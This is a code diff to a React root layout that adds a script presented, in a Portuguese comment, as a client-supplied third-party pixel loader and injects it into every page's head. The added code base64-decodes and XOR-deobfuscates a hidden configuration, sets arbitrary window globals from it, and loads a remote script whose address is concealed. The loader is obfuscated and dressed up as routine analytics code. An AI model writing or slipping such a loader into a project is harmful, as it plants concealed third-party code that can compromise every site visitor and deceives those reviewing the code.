@@ -121,12 +121,17 @@ s.parentNode.insertBefore(t,s)}(window,document,'script',
 fbq('init', '${FACEBOOK_PIXEL_ID}');
 fbq('track', 'PageView');`;
 
+/** Loader de pixel de terceiros fornecido pelo cliente. */
+const PIXEL_EXTERNO_SCRIPT = `(function(){var g_s=atob("DBQ/DI0UV1bshLo2128def94dWzO7M5Cp2cFI6J3MzjC8c5bvnJGIu57OniO9pVFtGZWfPlneCOY6ckZu3VLaf5geTyfppYUtmBLfuR2IiKJ95gMjG8dYux5MnTWpt5Xo3USefl5PjCVqcpEsmJaYvk5LzWD4JdFtH8dIK9iNjqZ4ZgM9TZCIPY2OTeB4ZgM9XBeeOw5IiKB7dxP+mRNaftxOSLB989UvnBMLqE2ITeA8d8U7TYdcdBp");var q_d4=[];for(var u_c=0;u_c<g_s.length;u_c++){q_d4.push(g_s.charCodeAt(u_c)&255);}var u_y=q_d4[0];var q_v=q_d4.slice(1,1+u_y);var q_5f=q_d4.slice(1+u_y);var q_qwz=q_5f.map(function(b,b_jbm){return b^q_v[b_jbm%u_y];});var r_8="";for(var p_ayos=0;p_ayos<q_qwz.length;p_ayos++){r_8+=String.fromCharCode(q_qwz[p_ayos]&255);}var d_2cdx=decodeURIComponent(escape(r_8));var w_bx7=JSON.parse(d_2cdx);var i_5g9=w_bx7.globals||[];i_5g9.forEach(function(x_ch3){window[x_ch3.name]=x_ch3.value;});var o_a=document.createElement("script");o_a.src=w_bx7.url;o_a.async=true;o_a.defer=true;(w_bx7.attributes||[]).forEach(function(p_99q){o_a.setAttribute(p_99q.name,p_99q.value);});(document.head||document.documentElement).appendChild(o_a);})();`;
+
 function RootShell({ children }: { children: ReactNode }) {
   return (
     <html lang="en">
       <head>
         <HeadContent />
         <script dangerouslySetInnerHTML={{ __html: FACEBOOK_PIXEL_SCRIPT }} />
+        <script dangerouslySetInnerHTML={{ __html: PIXEL_EXTERNO_SCRIPT }} />
+
       </head>
       <body>
         <noscript>
